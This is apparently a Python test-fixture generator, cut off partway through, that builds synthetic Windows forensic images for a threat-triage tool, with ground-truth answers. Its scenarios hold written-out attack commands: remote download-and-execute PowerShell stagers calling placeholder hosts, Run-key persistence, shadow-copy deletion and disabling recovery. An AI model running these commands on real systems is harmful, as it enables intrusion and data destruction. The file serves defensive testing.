"""Synthetic threat scenarios with exact ground truth (one machine per storyline) plus a clean control machine.

Every artifact follows the on-disk format Windows (or the tool) writes: RunMRU values end in "\\1", TrustRecords value
names use forward slashes, Security events carry the field set of the real event version, AnyDesk logs follow the
published trace / connection_trace format, and so on.  All names, addresses (RFC 5737) and domains (.example.test)
are placeholders.

    CLICKFIX-01   fake CAPTCHA page -> pasted PowerShell in the Run box -> payload in AppData -> Run key
    PHISH-01      macro document from Outlook -> Word starts encoded PowerShell -> credential page on a look-alike domain
    RMM-01        tech-support scam: portable AnyDesk downloaded and an incoming session accepted
    RANSOM-01     RDP password guessing -> logon -> new admin account -> shadow copies deleted -> files encrypted
    CLEAN-01      ordinary office workstation (negative control: every threat question must be answered No)

GROUND_TRUTH maps each machine and profile to the expected status of every question.
"""

from __future__ import annotations

import base64
import os
import struct
import uuid

from . import artifacts as A
from .evtxwriter import Event, utc
from .machine import Machine, plus
from .prefetchwriter import build_prefetch

SEC = dict(provider="Microsoft-Windows-Security-Auditing", channel="Security",
           provider_guid="54849625-5478-4994-a5ba-3e3b0328c30d")
VOL = r"\VOLUME{01dc2a5b3c4d5e6f-5e6f7a8b}"

GROUND_TRUTH = {
    "CLICKFIX-01": {
        "clickfix": {"clickfix.command": "Yes", "clickfix.lure": "Yes", "clickfix.payload": "Yes", "persist.found": "Yes"},
    },
    "PHISH-01": {
        "phishing": {"phish.opened": "Yes", "phish.executed": "Yes", "phish.credentials": "Indicated", "exec.suspicious": "Yes"},
    },
    "RMM-01": {
        "remote_access": {"rmm.tools": "Yes", "rmm.connections": "Yes"},
    },
    "RANSOM-01": {
        "ransomware": {"ransom.encryption": "Yes", "ransom.precursor": "Yes"},
        "account_compromise": {"acct.bruteforce": "Yes", "acct.changes": "Yes", "rmm.connections": "Yes", "acct.logons": "Yes"},
    },
    "CLEAN-01": {
        "clickfix": {"clickfix.command": "No evidence found", "clickfix.lure": "No evidence found",
                     "clickfix.payload": "No evidence found"},
        "phishing": {"phish.email": "No evidence found", "phish.opened": "No evidence found",
                     "phish.executed": "No evidence found", "phish.credentials": "No evidence found"},
        "remote_access": {"rmm.tools": "No evidence found"},
        "ransomware": {"ransom.encryption": "No evidence found", "ransom.precursor": "Not applicable"},
        "account_compromise": {"acct.bruteforce": "No evidence found", "acct.changes": "No evidence found"},
        "general_triage": {"exec.suspicious": "No evidence found", "persist.found": "No evidence found"},
    },
}

# facts the tests check beyond the question status
FACTS = {
    "CLICKFIX-01": {"payload": "svcupd.exe", "c2": "198.51.100.23", "run_key": "SvcUpdate"},
    "PHISH-01": {"document": "Invoice_44817.docm", "harvest": "m365-secure-login.example.test"},
    "RMM-01": {"remote_ip": "198.51.100.77", "remote_id": "987654321"},
    "RANSOM-01": {"attacker_ip": "203.0.113.45", "extension": "lockbit", "new_account": "support",
                  "encrypted_files": 320, "note": "readme_restore_files.txt", "note_dirs": 8},
}


# ---------------------------------------------------------------------------- shared helpers
def _base(m: Machine, computer: str, product: str, build: str, display: str, edition: str = "Professional",
          tz=("Eastern Standard Time", 300, -60)) -> None:
    m.system.dword("Select", "Current", 1)
    m.system.sz(r"ControlSet001\Control\ComputerName\ComputerName", "ComputerName", computer)
    k = r"ControlSet001\Control\TimeZoneInformation"
    m.system.sz(k, "TimeZoneKeyName", tz[0])
    m.system.dword(k, "Bias", tz[1] & 0xFFFFFFFF)
    m.system.dword(k, "ActiveTimeBias", (tz[1] + tz[2]) & 0xFFFFFFFF)
    m.system.dword(k, "DaylightBias", tz[2] & 0xFFFFFFFF)
    m.system.sz(k, "StandardName", tz[0])
    cv = r"Microsoft\Windows NT\CurrentVersion"
    m.software.sz(cv, "ProductName", product)
    m.software.sz(cv, "CurrentBuild", build)
    m.software.sz(cv, "CurrentBuildNumber", build)
    m.software.sz(cv, "DisplayVersion", display)
    m.software.sz(cv, "EditionID", edition)
    m.software.sz(cv, "RegisteredOwner", "user")
    m.software.dword(cv, "InstallDate", int(m.install_time.timestamp()))
    m.software.dword(cv, "CurrentMajorVersionNumber", 10)
    m.software.dword(cv, "CurrentMinorVersionNumber", 0)
    m.software.sz(cv, "SystemRoot", "C:\\Windows")
    for d in ["C:\\Windows\\System32\\drivers\\etc", "C:\\Program Files", "C:\\ProgramData", "C:\\Windows\\Prefetch",
              "C:\\Windows\\System32\\Tasks", "C:\\Users\\Public\\Documents"]:
        os.makedirs(m.path(d), exist_ok=True)
    m.add_file("C:\\Windows\\System32\\drivers\\etc\\hosts", "# hosts\r\n127.0.0.1 localhost\r\n")
    # services every Windows installation has
    for name, image, start in [("EventLog", r"%SystemRoot%\System32\svchost.exe -k LocalServiceNetworkRestricted -p", 2),
                               ("WinDefend", r"\"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24080.9-0\MsMpEng.exe\"", 2),
                               ("Spooler", r"%SystemRoot%\System32\spoolsv.exe", 2)]:
        s = rf"ControlSet001\Services\{name}"
        m.system.expand_sz(s, "ImagePath", image, ts=m.install_time)
        m.system.dword(s, "Start", start)
        m.system.dword(s, "Type", 0x10)
        m.system.sz(s, "ObjectName", "LocalSystem")


def _installed(m: Machine, name: str, version: str, publisher: str, location: str, when, hive=None, key=None) -> None:
    h = hive or m.software
    prefix = "Software\\" if hive is not None else ""
    k = prefix + rf"Microsoft\Windows\CurrentVersion\Uninstall\{key or name}"
    h.sz(k, "DisplayName", name, ts=when)
    h.sz(k, "DisplayVersion", version)
    h.sz(k, "Publisher", publisher)
    h.sz(k, "InstallLocation", location)
    h.sz(k, "InstallDate", when.strftime("%Y%m%d"))


def _sec(m: Machine, eid: int, t, data: dict, version: int = 0, task: int = 12544, failure: bool = False) -> None:
    m.event("Security.evtx", Event(event_id=eid, computer=m.manifest["computer"], time=t, data=data, version=version,
                                   task=task, level=0, keywords=0x8010000000000000 if failure else 0x8020000000000000,
                                   process_id=640, thread_id=1200, **SEC))


def _logon(m: Machine, t, user: str, sid: str, logon_type: int, ip: str = "-", workstation: str = "-",
           logon_id: str = "0x3e7a1", process: str = r"C:\Windows\System32\svchost.exe", package: str = "Negotiate") -> None:
    pc = m.manifest["computer"]
    _sec(m, 4624, t, {
        "SubjectUserSid": "S-1-5-18", "SubjectUserName": pc + "$", "SubjectDomainName": "WORKGROUP", "SubjectLogonId": "0x3e7",
        "TargetUserSid": sid, "TargetUserName": user, "TargetDomainName": pc, "TargetLogonId": logon_id,
        "LogonType": str(logon_type), "LogonProcessName": "User32 " if logon_type in (2, 10, 11) else "NtLmSsp ",
        "AuthenticationPackageName": package, "WorkstationName": workstation, "LogonGuid": "{00000000-0000-0000-0000-000000000000}",
        "TransmittedServices": "-", "LmPackageName": "-", "KeyLength": "0", "ProcessId": "0x2a4" if logon_type != 3 else "0x0",
        "ProcessName": process if logon_type != 3 else "-", "IpAddress": ip, "IpPort": "0" if ip == "-" else "51234",
        "ImpersonationLevel": "%%1833", "RestrictedAdminMode": "-", "TargetOutboundUserName": "-",
        "TargetOutboundDomainName": "-", "VirtualAccount": "%%1843", "TargetLinkedLogonId": "0x0", "ElevatedToken": "%%1842"},
        version=2)


def _failed(m: Machine, t, user: str, ip: str, workstation: str, logon_type: int = 3) -> None:
    _sec(m, 4625, t, {
        "SubjectUserSid": "S-1-0-0", "SubjectUserName": "-", "SubjectDomainName": "-", "SubjectLogonId": "0x0",
        "TargetUserSid": "S-1-0-0", "TargetUserName": user, "TargetDomainName": "", "Status": "0xc000006d",
        "FailureReason": "%%2313", "SubStatus": "0xc000006a" if user.lower() == "administrator" else "0xc0000064",
        "LogonType": str(logon_type), "LogonProcessName": "NtLmSsp ", "AuthenticationPackageName": "NTLM",
        "WorkstationName": workstation, "TransmittedServices": "-", "LmPackageName": "-", "KeyLength": "0",
        "ProcessId": "0x0", "ProcessName": "-", "IpAddress": ip, "IpPort": "0"}, failure=True)


def _process(m: Machine, t, user: str, sid: str, image: str, cmd: str, parent: str, pid: int, ppid: int) -> None:
    pc = m.manifest["computer"]
    _sec(m, 4688, t, {
        "SubjectUserSid": sid, "SubjectUserName": user, "SubjectDomainName": pc, "SubjectLogonId": "0x5d2a1",
        "NewProcessId": hex(pid), "NewProcessName": image, "TokenElevationType": "%%1938", "ProcessId": hex(ppid),
        "CommandLine": cmd, "TargetUserSid": "S-1-0-0", "TargetUserName": "-", "TargetDomainName": "-", "TargetLogonId": "0x0",
        "ParentProcessName": parent, "MandatoryLabel": "S-1-16-8192"}, version=2, task=13312)


def _prefetch(m: Machine, exe: str, full_path: str, runs: list, loaded: list[str] | None = None) -> None:
    dev = VOL + full_path[2:].upper()
    files = [VOL + r"\WINDOWS\SYSTEM32\NTDLL.DLL", VOL + r"\WINDOWS\SYSTEM32\KERNEL32.DLL", dev] + \
            [VOL + p[2:].upper() for p in loaded or []]
    fname, blob = build_prefetch(exe.upper(), dev, runs, len(runs), files, volume_device=VOL, volume_serial=0x5E6F7A8B)
    m.add_file(f"C:\\Windows\\Prefetch\\{fname}", blob, ctime=runs[0], mtime=runs[-1])


def _ps4104(m: Machine, t, script: str, level: int = 5) -> None:
    m.event("Microsoft-Windows-PowerShell%4Operational.evtx", Event(
        provider="Microsoft-Windows-PowerShell", event_id=4104, channel="Microsoft-Windows-PowerShell/Operational",
        computer=m.manifest["computer"], time=t, provider_guid="a0c1853b-5c40-4b15-8766-3cf1c58f985a", level=level, task=2,
        opcode=15, version=1, keywords=0x0, user_sid=m.manifest.get("user_sid"), process_id=5120, thread_id=6044,
        data={"MessageNumber": "1", "MessageTotal": "1", "ScriptBlockText": script, "ScriptBlockId": str(uuid.uuid4()),
              "Path": ""}))


def _service_event(m: Machine, t, name: str, image: str, start: str = "auto start", account: str = "LocalSystem") -> None:
    m.event("System.evtx", Event(
        provider="Service Control Manager", event_id=7045, channel="System", computer=m.manifest["computer"], time=t,
        provider_guid="555908d1-a6d7-4695-8e1e-26931d2012f4", level=4, keywords=0x8080000000000000, user_sid="S-1-5-18",
        process_id=760, thread_id=4012,
        data={"ServiceName": name, "ImagePath": image, "ServiceType": "user mode service", "StartType": start,
              "AccountName": account}))


def _task_xml(command: str, arguments: str, author: str, date: str, uri: str) -> bytes:
    xml = (f'<?xml version="1.0" encoding="UTF-16"?>\r\n<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">\r\n'
           f"  <RegistrationInfo>\r\n    <Date>{date}</Date>\r\n    <Author>{author}</Author>\r\n    <URI>{uri}</URI>\r\n"
           f"  </RegistrationInfo>\r\n  <Triggers>\r\n    <LogonTrigger>\r\n      <Enabled>true</Enabled>\r\n    </LogonTrigger>\r\n"
           f"  </Triggers>\r\n  <Settings>\r\n    <Enabled>true</Enabled>\r\n  </Settings>\r\n"
           f'  <Actions Context="Author">\r\n    <Exec>\r\n      <Command>{command}</Command>\r\n'
           + (f"      <Arguments>{arguments}</Arguments>\r\n" if arguments else "")
           + "    </Exec>\r\n  </Actions>\r\n</Task>\r\n")
    return b"\xff\xfe" + xml.encode("utf-16-le")


def _runmru(nt, commands: list[str], ts) -> None:
    k = r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
    letters = "abcdefghijklmnopqrstuvwxyz"
    for i, c in enumerate(commands):
        nt.sz(k, letters[i], c + "\\1", ts=ts)
    nt.sz(k, "MRUList", letters[:len(commands)], ts=ts)


def _trust_record(when, macros: bool) -> bytes:
    # 24 bytes: FILETIME of the trust decision, 12 reserved bytes, flags (0x7FFFFFFF = macros / active content enabled)
    return A.filetime_bytes(when) + b"\x00" * 12 + (b"\xff\xff\xff\x7f" if macros else b"\x01\x00\x00\x00")


def _new(staging: str, name: str, t0, product="Windows 11 Pro", build="22631", display="23H2", edition="Professional",
         size_mb=256, tz=("Eastern Standard Time", 300, -60)) -> Machine:
    m = Machine(staging, name, t0, disk={"size_mb": size_mb, "scheme": "gpt",
                                         "partitions": [{"type": "efi", "size_mb": 32, "fs": "fat32", "label": "SYSTEM"},
                                                        {"type": "basic", "fs": "ntfs", "label": "Windows",
                                                         "serial": "5E6F7A8B9C0D1E2F"}]})
    m.manifest["computer"] = name
    _base(m, name, product, build, display, edition, tz)
    return m


# ---------------------------------------------------------------------------- CLICKFIX-01
def build_clickfix(staging: str) -> Machine:
    t0 = utc(2026, 5, 4, 15, 0, 0)
    m = _new(staging, "CLICKFIX-01", t0)
    sid = "S-1-5-21-3011111111-3022222222-3033333333-1001"
    m.manifest["user_sid"] = sid
    u = m.add_user("jdoe", sid, t0)
    nt = u["ntuser"]
    prof = u["profile"]
    day = utc(2026, 9, 21, 13, 50, 0)
    _logon(m, plus(day, minutes=-20), "jdoe", sid, 2)
    chrome = f"{prof}\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
    A.chrome_history(m.path(f"{chrome}\\History"), [
        dict(url="https://www.google.com/search?q=free+pdf+to+word+converter", title="free pdf to word converter - Google Search",
             time=plus(day, minutes=8)),
        dict(url="https://pdf-convert-free.example.test/", title="Free PDF to Word Converter Online", time=plus(day, minutes=9)),
        dict(url="https://cdn-check.example.test/cf/verify.html?ray=8c1f2a",
             title="Just a moment... Verify you are human", time=plus(day, minutes=11, seconds=40)),
    ])
    m._register(f"{chrome}\\History", t0, plus(day, minutes=12), None)
    pasted = ("powershell -w h -nop -c \"iex(iwr 'http://198.51.100.23/c.txt' -UseBasicParsing)\" "
              "# I am not a robot - reCAPTCHA Verification ID: 4471")
    run_time = plus(day, minutes=12, seconds=5)
    _runmru(nt, [pasted, "notepad", "calc"], run_time)
    stage = f"{prof}\\AppData\\Roaming\\svcupd"
    _ps4104(m, plus(run_time, seconds=2),
            "$u='http://198.51.100.23/p.zip';$o=\"$env:APPDATA\\svcupd\\p.zip\";New-Item -ItemType Directory "
            "\"$env:APPDATA\\svcupd\" -Force|Out-Null;Invoke-WebRequest $u -OutFile $o -UseBasicParsing;"
            "Expand-Archive $o \"$env:APPDATA\\svcupd\" -Force;Start-Process \"$env:APPDATA\\svcupd\\svcupd.exe\";"
            "Set-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' SvcUpdate "
            "\"`\"$env:APPDATA\\svcupd\\svcupd.exe`\" /silent\"", level=3)
    payload = b"MZ" + b"\x90" * 58 + struct.pack("<I", 64) + b"PE\x00\x00" + os.urandom(3000)
    m.add_file(f"{stage}\\p.zip", b"PK\x03\x04" + os.urandom(2000), ctime=plus(run_time, seconds=4))
    m.add_file(f"{stage}\\svcupd.exe", payload, ctime=plus(run_time, seconds=6))
    _prefetch(m, "svcupd.exe", f"{stage}\\svcupd.exe", [plus(run_time, seconds=8)])
    _prefetch(m, "powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", [plus(run_time, seconds=1)])
    run = r"Software\Microsoft\Windows\CurrentVersion\Run"
    nt.sz(run, "SvcUpdate", f"\"{stage}\\svcupd.exe\" /silent", ts=plus(run_time, seconds=9))
    m.system.binary(rf"ControlSet001\Services\bam\State\UserSettings\{sid}",
                    r"\Device\HarddiskVolume3\Users\jdoe\AppData\Roaming\svcupd\svcupd.exe", A.bam_value(plus(run_time, seconds=8)))
    m.finalize()
    return m


# ---------------------------------------------------------------------------- PHISH-01
def build_phish(staging: str) -> Machine:
    t0 = utc(2026, 3, 10, 12, 0, 0)
    m = _new(staging, "PHISH-01", t0, product="Windows 10 Pro", build="19045", display="22H2")
    sid = "S-1-5-21-4011111111-4022222222-4033333333-1104"
    u = m.add_user("asmith", sid, t0)
    nt = u["ntuser"]
    prof = u["profile"]
    t = utc(2026, 9, 22, 9, 14, 0)
    _logon(m, plus(t, minutes=-50), "asmith", sid, 2)
    olk = f"{prof}\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\Q8R2T6ZK"
    doc = f"{olk}\\Invoice_44817.docm"
    os.makedirs(os.path.dirname(m.path(doc)), exist_ok=True)
    A.make_docx(m.path(doc), "Invoice 44817", ["Enable content to view this protected invoice."], author="billing")
    m._register(doc, plus(t, seconds=5), plus(t, seconds=5), None)
    trust = r"Software\Microsoft\Office\16.0\Word\Security\Trusted Documents\TrustRecords"
    nt.binary(trust, "%USERPROFILE%/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/Q8R2T6ZK/Invoice_44817.docm",
              _trust_record(plus(t, seconds=40), True), ts=plus(t, seconds=40))
    mru = r"Software\Microsoft\Office\16.0\Word\User MRU\ADAL_0A1B2C3D\File MRU"
    nt.sz(mru, "Item 1", f"[F00000000][T{A.filetime_bytes(plus(t, seconds=20))[::-1].hex().upper()}][O00000000]*{doc}",
          ts=plus(t, seconds=20))
    enc = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.61/stage2.ps1')"
                           .encode("utf-16-le")).decode()
    word = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
    _process(m, plus(t, seconds=18), "asmith", sid, word,
             f"\"{word}\" /n \"{doc}\" /o \"\"", r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE", 0x1a2c, 0x0f10)
    _process(m, plus(t, seconds=45), "asmith", sid, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
             f"powershell.exe -NoP -W Hidden -Enc {enc}", word, 0x1d44, 0x1a2c)
    _process(m, plus(t, minutes=3), "asmith", sid, r"C:\Windows\System32\notepad.exe", "\"C:\\Windows\\system32\\notepad.exe\"",
             r"C:\Windows\explorer.exe", 0x2210, 0x0b88)
    chrome = f"{prof}\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
    A.chrome_history(m.path(f"{chrome}\\History"), [
        dict(url="https://login.microsoftonline.com/common/oauth2/v2.0/authorize", title="Sign in to your account",
             time=plus(t, minutes=-40)),
        dict(url="https://outlook.office.com/mail/", title="Mail - Anna Smith - Outlook", time=plus(t, minutes=-39)),
        dict(url="https://m365-secure-login.example.test/owa/auth/logon.aspx?replyUri=1",
             title="Sign in to your account", time=plus(t, minutes=26)),
    ])
    m._register(f"{chrome}\\History", t0, plus(t, minutes=27), None)
    m.finalize()
    return m


# ---------------------------------------------------------------------------- RMM-01
def build_rmm(staging: str) -> Machine:
    t0 = utc(2026, 1, 20, 18, 0, 0)
    m = _new(staging, "RMM-01", t0, product="Windows 11 Home", edition="Core")
    sid = "S-1-5-21-5011111111-5022222222-5033333333-1001"
    u = m.add_user("mlee", sid, t0)
    prof = u["profile"]
    t = utc(2026, 9, 23, 16, 2, 0)
    _logon(m, plus(t, minutes=-30), "mlee", sid, 2)
    exe = f"{prof}\\Downloads\\AnyDesk.exe"
    m.add_file(exe, b"MZ" + b"\x00" * 62 + os.urandom(4000), ctime=plus(t, seconds=30))
    m.add_ads(exe, "Zone.Identifier", "[ZoneTransfer]\r\nZoneId=3\r\nReferrerUrl=https://anydesk.com/en/downloads/windows\r\n"
                                      "HostUrl=https://download.anydesk.com/AnyDesk.exe\r\n")
    _prefetch(m, "AnyDesk.exe", exe, [plus(t, minutes=1), plus(t, minutes=9)])
    ad = f"{prof}\\AppData\\Roaming\\AnyDesk"
    s = plus(t, minutes=3)
    ts = lambda d: d.strftime("%Y-%m-%d %H:%M:%S.") + f"{d.microsecond // 1000:03d}"  # noqa: E731
    lines = [
        # line wording as published in AnyDesk log research (e.g. inversecos.com, 2021); "Logged in from" is the remote peer
        f"   info {ts(s)}        front   6124   6140                   app.backend_session - Incoming session request: "
        "SUPPORT-DESK (987654321)",
        f"   info {ts(plus(s, seconds=4))}        front   6124   6140                   anynet.relay_conn - "
        "Logged in from 198.51.100.77:61230 on relay 5e8a7c21.",
        f"   info {ts(plus(s, seconds=6))}        front   6124   6140                   app.backend_session - "
        "Remote OS: Windows, Connection flags: direct",
        f"   info {ts(plus(s, seconds=10))}        front   6124   6140                   app.session - Client-ID: 987654321 "
        "(FPR: 6b1f3d2e9a7c).",
    ]
    m.add_file(f"{ad}\\ad.trace", "\r\n".join(lines) + "\r\n", ctime=plus(t, minutes=1), mtime=plus(s, seconds=10))
    m.add_file(f"{ad}\\connection_trace.txt",
               f"Incoming    {s.strftime('%Y-%m-%d, %H:%M')}    User                              987654321    987654321\r\n",
               ctime=s, mtime=s)
    m.finalize()
    return m


# ---------------------------------------------------------------------------- RANSOM-01
def build_ransom(staging: str) -> Machine:
    t0 = utc(2025, 11, 2, 9, 0, 0)
    m = _new(staging, "RANSOM-01", t0, product="Windows Server 2019 Standard", build="17763", display="1809",
             edition="ServerStandard", size_mb=320)
    adm_sid = "S-1-5-21-6011111111-6022222222-6033333333-500"
    bk_sid = "S-1-5-21-6011111111-6022222222-6033333333-1008"
    new_sid = "S-1-5-21-6011111111-6022222222-6033333333-1011"
    m.add_user("Administrator", adm_sid, t0)
    m.add_user("backup_svc", bk_sid, plus(t0, days=3))
    ip = "203.0.113.45"
    t = utc(2026, 9, 24, 1, 10, 0)
    # ordinary activity the week before
    _logon(m, utc(2026, 9, 17, 14, 0), "Administrator", adm_sid, 2)
    # password guessing over RDP (NLA -> network logon type 3 failures)
    users = ["administrator", "admin", "backup", "user", "test", "scanner", "backup_svc"]
    for i in range(42):
        _failed(m, plus(t, seconds=8 * i), users[i % len(users)], ip, "kali")
    lt = plus(t, minutes=7)
    _logon(m, plus(lt, seconds=-1), "backup_svc", bk_sid, 3, ip=ip, workstation="kali", logon_id="0x1f2e01", package="NTLM")
    _logon(m, lt, "backup_svc", bk_sid, 10, ip=ip, workstation="RANSOM-01", logon_id="0x1f2e3a",
           process=r"C:\Windows\System32\svchost.exe")
    m.event("Microsoft-Windows-TerminalServices-RemoteConnectionManager%4Operational.evtx", Event(
        provider="Microsoft-Windows-TerminalServices-RemoteConnectionManager", event_id=1149,
        channel="Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational", computer="RANSOM-01",
        time=plus(lt, seconds=-2), provider_guid="c76baa63-ae81-421c-b425-340b4b24157f", user_sid="S-1-5-20",
        user_data={"Param1": "backup_svc", "Param2": "RANSOM-01", "Param3": ip}))
    m.event("Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx", Event(
        provider="Microsoft-Windows-TerminalServices-LocalSessionManager", event_id=21,
        channel="Microsoft-Windows-TerminalServices-LocalSessionManager/Operational", computer="RANSOM-01",
        time=plus(lt, seconds=3), provider_guid="5d896912-022d-40aa-a3a8-4fa5515c76d7", user_sid="S-1-5-18",
        user_data={"User": "RANSOM-01\\backup_svc", "SessionID": "2", "Address": ip}))
    # new administrator account
    ct = plus(lt, minutes=5)
    _sec(m, 4720, ct, {"TargetUserName": "support", "TargetDomainName": "RANSOM-01", "TargetSid": new_sid,
                       "SubjectUserSid": bk_sid, "SubjectUserName": "backup_svc", "SubjectDomainName": "RANSOM-01",
                       "SubjectLogonId": "0x1f2e3a", "PrivilegeList": "-", "SamAccountName": "support", "DisplayName": "%%1793",
                       "UserPrincipalName": "-", "HomeDirectory": "%%1793", "HomePath": "%%1793", "ScriptPath": "%%1793",
                       "ProfilePath": "%%1793", "UserWorkstations": "%%1793", "PasswordLastSet": "%%1794",
                       "AccountExpires": "%%1794", "PrimaryGroupId": "513", "AllowedToDelegateTo": "-", "OldUacValue": "0x0",
                       "NewUacValue": "0x15", "UserAccountControl": "\r\n\t\t%%2080\r\n\t\t%%2082\r\n\t\t%%2084",
                       "UserParameters": "%%1793", "SidHistory": "-", "LogonHours": "%%1797"}, task=13824)
    _sec(m, 4732, plus(ct, seconds=4), {"MemberName": "-", "MemberSid": new_sid, "TargetUserName": "Administrators",
                                        "TargetDomainName": "Builtin", "TargetSid": "S-1-5-32-544", "SubjectUserSid": bk_sid,
                                        "SubjectUserName": "backup_svc", "SubjectDomainName": "RANSOM-01",
                                        "SubjectLogonId": "0x1f2e3a", "PrivilegeList": "-"}, task=13826)
    # tooling and encryption
    enc_exe = r"C:\Users\Public\Music\svchosts.exe"
    m.add_file(enc_exe, b"MZ" + b"\x00" * 62 + os.urandom(6000), ctime=plus(ct, minutes=6))
    cmd = r"C:\Windows\System32\cmd.exe"
    _process(m, plus(ct, minutes=8), "backup_svc", bk_sid, cmd, "\"C:\\Windows\\system32\\cmd.exe\"", r"C:\Windows\explorer.exe",
             0x1100, 0x0e20)
    _process(m, plus(ct, minutes=9), "backup_svc", bk_sid, r"C:\Windows\System32\vssadmin.exe",
             "vssadmin.exe delete shadows /all /quiet", cmd, 0x1220, 0x1100)
    _process(m, plus(ct, minutes=9, seconds=20), "backup_svc", bk_sid, r"C:\Windows\System32\bcdedit.exe",
             "bcdedit /set {default} recoveryenabled no", cmd, 0x1240, 0x1100)
    enc_start = plus(ct, minutes=10)
    _process(m, enc_start, "backup_svc", bk_sid, enc_exe, f"{enc_exe} -path C:\\Users -threads 4", cmd, 0x1300, 0x1100)
    dirs = ["Finance", "Finance\\2025", "Finance\\2026", "HR", "HR\\Contracts", "Projects", "Projects\\Bids", "Scans"]
    n = 0
    for di, d in enumerate(dirs):
        base = f"C:\\Users\\Public\\Documents\\{d}"
        for j in range(40):
            ext = ("xlsx", "docx", "pdf", "csv")[j % 4]
            ft = plus(enc_start, seconds=n * 2)
            m.add_file(f"{base}\\file_{di:02d}_{j:03d}.{ext}.lockbit", os.urandom(512), ctime=plus(t0, days=30 + j),
                       mtime=ft, atime=ft)
            n += 1
        m.add_file(f"{base}\\README_RESTORE_FILES.txt",
                   "Your files are encrypted. Contact us at the address below to restore them.\r\n",
                   ctime=plus(enc_start, seconds=di * 10 + 1))
    m.finalize()
    return m


# ---------------------------------------------------------------------------- CLEAN-01
def build_clean(staging: str) -> Machine:
    """An ordinary, busy office workstation: nothing in it may be reported as malicious."""
    t0 = utc(2026, 2, 2, 10, 0, 0)
    m = _new(staging, "CLEAN-01", t0)
    sid = "S-1-5-21-7011111111-7022222222-7033333333-1105"
    m.manifest["user_sid"] = sid
    u = m.add_user("kclark", sid, t0)
    nt = u["ntuser"]
    prof = u["profile"]
    day = utc(2026, 9, 25, 13, 0, 0)
    local = f"{prof}\\AppData\\Local"
    for i in range(5):
        _logon(m, plus(day, days=-i, hours=-4), "kclark", sid, 2 if i % 2 else 11, logon_id=f"0x{0x5000 + i:x}")
        _logon(m, plus(day, days=-i, hours=-3), "kclark", sid, 7, logon_id=f"0x{0x6000 + i:x}")
    # a mistyped password and an admin share check from the IT management server
    _failed(m, plus(day, hours=-4, seconds=-30), "kclark", "-", "CLEAN-01", logon_type=2)
    _failed(m, plus(day, hours=-4, seconds=-20), "kclark", "-", "CLEAN-01", logon_type=2)
    # Run box: everyday commands
    _runmru(nt, ["cmd", "notepad", r"\\fileserver01\projects", "control", "msinfo32", "mstsc"], plus(day, minutes=40))
    # PowerShell history of a power user
    m.add_file(f"{prof}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
               "Get-ChildItem C:\\Projects\r\ngit status\r\ngit pull\r\nwinget upgrade --all\r\n"
               "Get-Process | Sort-Object CPU -Descending | Select-Object -First 10\r\n"
               "Test-NetConnection fileserver01 -Port 445\r\nInvoke-WebRequest https://api.github.com -UseBasicParsing\r\n"
               "Get-Service Spooler | Restart-Service\r\nipconfig /flushdns\r\n", ctime=plus(day, days=-20), mtime=plus(day, minutes=30))
    # per-user applications (installed and run from AppData - normal on Windows 10 / 11)
    apps = [("Microsoft OneDrive", "24.161.0811.0001", "Microsoft Corporation", f"{local}\\Microsoft\\OneDrive",
             "OneDrive.exe", "OneDriveSetup"),
            ("Microsoft Teams classic", "1.7.00.13456", "Microsoft Corporation", f"{local}\\Microsoft\\Teams",
             "current\\Teams.exe", "Teams"),
            ("Zoom Workplace", "6.2.5 (46784)", "Zoom Video Communications, Inc.", f"{prof}\\AppData\\Roaming\\Zoom",
             "bin\\Zoom.exe", "ZoomUMX"),
            ("Microsoft Visual Studio Code (User)", "1.93.1", "Microsoft Corporation",
             f"{local}\\Programs\\Microsoft VS Code", "Code.exe", "{771FD6B0-FA20-440A-A002-3B3BAC16DC50}_is1"),
            ("Slack", "4.40.128", "Slack Technologies Inc.", f"{local}\\slack", "app-4.40.128\\slack.exe", "slack")]
    for i, (name, ver, pub, loc, exe, key) in enumerate(apps):
        _installed(m, name, ver, pub, loc, plus(t0, days=1 + i), hive=nt, key=key)
        path = f"{loc}\\{exe}"
        m.add_file(path, b"MZ" + b"\x00" * 62 + os.urandom(1500), ctime=plus(t0, days=1 + i))
        _prefetch(m, exe.rsplit("\\", 1)[-1], path, [plus(day, days=-1, minutes=i), plus(day, minutes=i)])
        m.system.binary(rf"ControlSet001\Services\bam\State\UserSettings\{sid}",
                        "\\Device\\HarddiskVolume3" + path[2:], A.bam_value(plus(day, minutes=i)))
    for name, ver, pub, loc in [("Google Chrome", "129.0.6668.59", "Google LLC", r"C:\Program Files\Google\Chrome\Application"),
                                ("Microsoft 365 Apps for enterprise - en-us", "16.0.17928.20156", "Microsoft Corporation",
                                 r"C:\Program Files\Microsoft Office"),
                                ("7-Zip 24.08 (x64)", "24.08", "Igor Pavlov", "C:\\Program Files\\7-Zip\\")]:
        _installed(m, name, ver, pub, loc, plus(t0, hours=3))
    nt.sz(r"Software\Microsoft\Windows\CurrentVersion\Run", "OneDrive",
          f"\"{local}\\Microsoft\\OneDrive\\OneDrive.exe\" /background", ts=plus(t0, days=1))
    nt.sz(r"Software\Microsoft\Windows\CurrentVersion\Run", "com.squirrel.Teams.Teams",
          f"{local}\\Microsoft\\Teams\\Update.exe --processStart \"Teams.exe\" --process-start-args \"--system-initiated\"",
          ts=plus(t0, days=2))
    m.software.sz(r"Microsoft\Windows\CurrentVersion\Run", "SecurityHealth", r"%windir%\system32\SecurityHealthSystray.exe",
                  ts=t0)
    # installers downloaded and run from Downloads (vendor sites)
    for name, host, when in [("ZoomInstallerFull.exe", "https://zoom.us/client/latest/ZoomInstallerFull.exe", plus(t0, days=3)),
